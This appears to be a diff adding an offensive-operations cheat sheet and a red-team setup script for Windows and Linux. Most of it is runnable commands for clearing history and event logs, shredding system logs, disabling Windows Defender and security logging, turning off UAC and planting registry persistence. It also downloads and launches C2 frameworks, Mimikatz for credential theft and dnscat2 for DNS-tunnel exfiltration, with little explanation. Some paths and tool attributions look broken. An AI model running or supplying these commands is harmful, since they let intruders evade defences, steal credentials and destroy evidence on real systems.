@@ -1,0 +1,277 @@
+###------ Powershell Adv --------###
+
+
+Find the History File Path:--->
+
+PS:> (Get-PSReadlineOption).HistorySavePath
+
+Delete the History File:---->
+
+PSL> Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+Alternatively, if you want to replace it with an empty file (which effectively clears it), run:
+powershell
+New-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
+
+### ---- Windows -----###
+
+Clearing Event Logs with PowerShell:
+
+PS:> Clear-EventLog -LogName Application, System, Security
+
+To clear all event logs:
+
+PS:> Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
+
+### ----- Kali Linux -----###
+
+Clearing System Logs:
+
+System logs are typically stored in the /var/log directory.
+
+$ sudo truncate -s 0 /var/log/auth.log
+$ sudo truncate -s 0 /var/log/syslog
+$ sudo truncate -s 0 /var/log/kern.log
+
+Using shred Command:
+
+The shred command can be used to securely delete log files:
+
+$ sudo shred -u /var/log/auth.log
+$ sudo shred -u /var/log/syslog
+$ sudo shred -u /var/log/kern.log
+
+Using logrotate:
+
+Configure logrotate to manage and rotate logs, ensuring old logs are securely deleted:
+
+$ sudo nano /etc/logrotate.conf
+
+
+=========================================
+
+1. Disabling Windows Defender :----->
+
+PS:> Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
+Write-Output "Windows Defender has been disabled."
+
+
+2. Hiding Executables from Antivirus Scanners: ---->
+
+# Add executables to Windows Defender exclusion list
+
+$exclusionPath = "C:\Path\To\Your\Executable.exe"
+Add-MpPreference -ExclusionPath $exclusionPath
+Write-Output "Executable $exclusionPath added to Windows Defender exclusion list."
+
+
+3. Persistence via Registry Run Keys:--->
+
+# Add a persistent payload to the registry run key
+
+$payloadPath = "C:\Path\To\Your\Payload.exe"
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentPayload" -Value $payloadPath
+Write-Output "Persistent payload added to registry run key."
+
+
+4: Disable Security Event Logging:--->
+
+# Disable security event logging
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "Start" -Value 4
+Write-Output "Security event logging has been disabled."
+
+
+5: Escalate Privileges via User Account Control (UAC) Bypass:---->
+
+# Bypass UAC prompts
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0
+Write-Output "UAC bypassed, privilege elevation enabled without prompts."
+
+
+6: Stealthy Command Execution via Registry:---->
+
+# Stealthy command execution via registry
+
+$cmd = "C:\Path\To\Your\Command.exe"
+Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $cmd
+Write-Output "Stealthy command execution path set in registry."
+
+
+============================================================
+
+### PART 1: System Preparation and OpSec Configuration ###
+
+Write-Host "Starting system preparation and operational security (OpSec) configuration..."
+
+# Disable Windows Defender and other security features that could interfere with Red Team tools
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableIOAVProtection $true
+
+# Disable unnecessary logging to reduce footprint
+wevtutil sl "Security" /e:false
+wevtutil sl "System" /e:false
+wevtutil sl "Application" /e:false
+
+# Remove telemetry and tracking features
+$TelemetryServices = @(
+    "DiagTrack", 
+    "dmwappushservice", 
+    "WerSvc"
+)
+foreach ($Service in $TelemetryServices) {
+    Stop-Service -Name $Service -Force
+    Set-Service -Name $Service -StartupType Disabled
+}
+
+# Clear Windows event logs to remove traces
+wevtutil cl "Security"
+wevtutil cl "System"
+wevtutil cl "Application"
+
+Write-Host "System preparation and OpSec configuration completed."
+
+
+### PART 2: Installation of Red Team Tools and Frameworks ###
+
+Write-Host "Installing Red Team tools and frameworks..."
+
+# Download and install key Red Team tools
+$Tools = @(
+    "https://github.com/cobbr/Covenant/releases/download/v0.7/Covenant.zip",        # Covenant C2 framework
+    "https://github.com/EmpireProject/Empire/archive/refs/heads/master.zip",       # Empire C2 framework
+    "https://github.com/bartblaze/Mimikatz/releases/download/2.2.0/2.2.0.zip",     # Mimikatz for credential harvesting
+    "https://github.com/SecureAuthCorp/impacket/archive/refs/heads/master.zip",    # Impacket for network exploitation
+    "https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip",# PowerSploit for privilege escalation
+    "https://github.com/cobbr/SharpSploit/releases/download/v1.1.0/SharpSploit.zip",# SharpSploit for .NET post-exploitation
+    "https://github.com/GhostPack/Seatbelt/releases/download/v1.0/Seatbelt.zip",   # Seatbelt for situational awareness
+    "https://github.com/samratashok/nishang/archive/refs/heads/master.zip",        # Nishang for PowerShell payloads
+    "https://github.com/BC-SECURITY/Empire/archive/refs/heads/master.zip"          # Empire Framework for post exploitation
+)
+
+$DownloadPath = "C:\Tools\RedTeam"
+New-Item -ItemType Directory -Path $DownloadPath -Force
+
+foreach ($ToolUrl in $Tools) {
+    $FileName = [System.IO.Path]::GetFileName($ToolUrl)
+    $FilePath = Join-Path $DownloadPath $FileName
+    Invoke-WebRequest -Uri $ToolUrl -OutFile $FilePath
+    if ($FilePath -like "*.zip") {
+        Expand-Archive -Path $FilePath -DestinationPath (Join-Path $DownloadPath ([System.IO.Path]::GetFileNameWithoutExtension($FileName)))
+    }
+}
+
+# Install Python3 and pip for additional offensive tools
+Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe" -OutFile "$DownloadPath\python-3.10.6-amd64.exe"
+Start-Process -FilePath "$DownloadPath\python-3.10.6-amd64.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
+
+# Install Python modules for Red Team operations
+pip install pycryptodome paramiko impacket
+
+Write-Host "Red Team tools installation completed."
+
+
+### PART 3: Network Enumeration and Exploitation Configuration ###
+
+Write-Host "Configuring network enumeration and exploitation toolkit..."
+
+# Configure Nmap for scanning and reconnaissance
+Invoke-WebRequest -Uri "https://nmap.org/dist/nmap-7.91-setup.exe" -OutFile "$DownloadPath\nmap-7.91-setup.exe"
+Start-Process -FilePath "$DownloadPath\nmap-7.91-setup.exe" -ArgumentList "/S" -Wait
+
+# Set up Responder for LLMNR and NBT-NS poisoning
+Invoke-WebRequest -Uri "https://github.com/lgandx/Responder/archive/refs/heads/master.zip" -OutFile "$DownloadPath\Responder.zip"
+Expand-Archive -Path "$DownloadPath\Responder.zip" -DestinationPath "$DownloadPath\Responder"
+
+# Install Metasploit for exploitation and post-exploitation
+Invoke-WebRequest -Uri "https://downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe" -OutFile "$DownloadPath\metasploit-latest-windows-installer.exe"
+Start-Process -FilePath "$DownloadPath\metasploit-latest-windows-installer.exe" -ArgumentList "/S" -Wait
+
+Write-Host "Network enumeration and exploitation configuration completed."
+
+
+### PART 4: Secure Communication and C2 Setup ###
+
+Write-Host "Setting up secure communication channels and C2 infrastructure..."
+
+# Set up a VPN client for secure remote access (e.g., OpenVPN)
+Invoke-WebRequest -Uri "https://swupdate.openvpn.org/community/releases/OpenVPN-2.5.2-I601-amd64.msi" -OutFile "$DownloadPath\OpenVPN-2.5.2-I601-amd64.msi"
+Start-Process -FilePath "$DownloadPath\OpenVPN-2.5.2-I601-amd64.msi" -ArgumentList "/quiet" -Wait
+
+# Set up C2 infrastructure (Covenant, Empire, etc.)
+Write-Host "Configuring Covenant C2..."
+Start-Process powershell -ArgumentList "Start-Process 'C:\Tools\RedTeam\Covenant\Covenant.exe'"
+
+Write-Host "Configuring Empire C2..."
+Start-Process powershell -ArgumentList "Start-Process 'C:\Tools\RedTeam\Empire\Empire.ps1'"
+
+Write-Host "Secure communication and C2 setup completed."
+
+
+### PART 5: Credential Harvesting and Privilege Escalation ###
+
+Write-Host "Configuring credential harvesting and privilege escalation tools..."
+
+# Extract and execute Mimikatz for credential harvesting
+Expand-Archive -Path "$DownloadPath\Mimikatz.zip" -DestinationPath "$DownloadPath\Mimikatz"
+Start-Process -FilePath "$DownloadPath\Mimikatz\x64\mimikatz.exe"
+
+# Configure PowerSploit for privilege escalation
+Start-Process powershell -ArgumentList "Import-Module '$DownloadPath\PowerSploit\PowerSploit.psd1'"
+
+# Load SharpSploit for .NET post-exploitation
+Add-Type -Path "$DownloadPath\SharpSploit\SharpSploit.dll"
+
+Write-Host "Credential harvesting and privilege escalation configuration completed."
+
+
+### PART 6: Data Exfiltration and Obfuscation ###
+
+Write-Host "Setting up data exfiltration and obfuscation methods..."
+
+# Set up DNS tunneling for covert data exfiltration
+Invoke-WebRequest -Uri "https://github.com/iagox86/dnscat2/archive/refs/heads/master.zip" -OutFile "$DownloadPath\dnscat2.zip"
+Expand-Archive -Path "$DownloadPath\dnscat2.zip" -DestinationPath "$DownloadPath\dnscat2"
+Start-Process powershell -ArgumentList "Start-Process 'C:\Tools\RedTeam\dnscat2\server.rb'"
+
+# Configure HTTPS tunneling using Invoke-Obfuscation for PowerShell scripts
+Import-Module "$DownloadPath\Nishang\Invoke-Obfuscation.psd1"
+Invoke-Obfuscation
+
+Write-Host "Data exfiltration and obfuscation setup completed."
+
+
+### PART 7: Automated Logging and Reporting ###
+
+Write-Host "Configuring automated logging and reporting for Red Team activities..."
+
+# Set up centralized logging for Red Team tools
+$LogPath = "C:\Logs\RedTeam"
+New-Item -Path $LogPath -ItemType Directory -Force
+$ToolsLogs = @(
+    "$DownloadPath\Empire\logs",
+    "$DownloadPath\Covenant\logs",
+    "$DownloadPath\Mimikatz\log.txt"
+)
+foreach ($Log in $ToolsLogs) {
+    Copy-Item -Path $Log -Destination $LogPath
+}
+
+# Automate daily reporting of Red Team activities
+$ReportFile = "$LogPath\DailyRedTeamReport.txt"
+$LogSummary = Get-ChildItem -Path $LogPath | Select-String -Pattern "Executed|Successful|Credential|Privilege"
+$LogSummary | Out-File -FilePath $ReportFile -Force
+
+Write-Host "Logging and reporting configuration completed."
+
+
+### PART 8: Final Setup and Execution ###
+
+Write-Host "Red Team operator environment setup completed successfully. You are now ready to conduct offensive operations securely."
+
+
+
